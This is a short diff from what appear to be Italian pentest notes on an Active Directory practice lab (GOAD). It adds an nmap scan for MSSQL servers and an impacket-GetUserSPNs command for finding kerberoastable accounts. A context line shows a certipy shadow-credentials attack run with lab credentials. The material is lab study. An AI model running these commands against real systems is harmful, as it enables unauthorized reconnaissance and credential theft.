@@ -276,8 +276,13 @@ certipy-ad shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.ta
 ![[Pasted image 20230828173854.png]]
 
 ### **ENUM MSSQL**
+Vediamo quali server hanno MSSQL attivo
+```bash
+nmap -p 1433 -sV -sC 192.168.56.10-23
+```
+
 Controlliamo se ci sono utenti con SPN sul server MSSQL
 ```bash
 impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
-
+![[Pasted image 20230830104754.png]]
